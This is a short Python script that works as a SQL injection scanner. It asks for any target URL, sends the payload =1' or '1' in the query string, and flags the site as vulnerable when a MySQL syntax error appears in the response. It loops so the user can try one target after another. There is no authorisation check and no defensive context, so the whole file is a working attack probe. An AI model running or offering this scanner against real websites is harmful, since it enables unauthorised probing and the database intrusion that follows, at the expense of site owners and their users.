
import urllib.request

while True:
    try:
        target = input("Enter Target Full URL: ")
        resp = urllib.request.urlopen(target + "=1\' or \'1\'")
        body = resp.read()
        fullbody = body.decode('utf-8')
        if "You have an error in your SQL syntax" in fullbody:
            print("")
            print("[!] Vulnerable to SQL Injection [!]")
            print("[!] Target: " + target + "")
            print("")
            input("Press Enter to try another Target:")
            print("")
            continue
        else:
            print("")
            print("[-] Target not Vulnerable to SQL Injection [-]")
            print("")
            input("Press Enter to try another Target:")
            print("")
            continue
    except ValueError as e:
        print("")
        print("[!] " + str(e) + " [!]")
        print("[!] Target URL must be full path http://www.site.com/index.php?cat_id= [!]")
        print("")
        continue
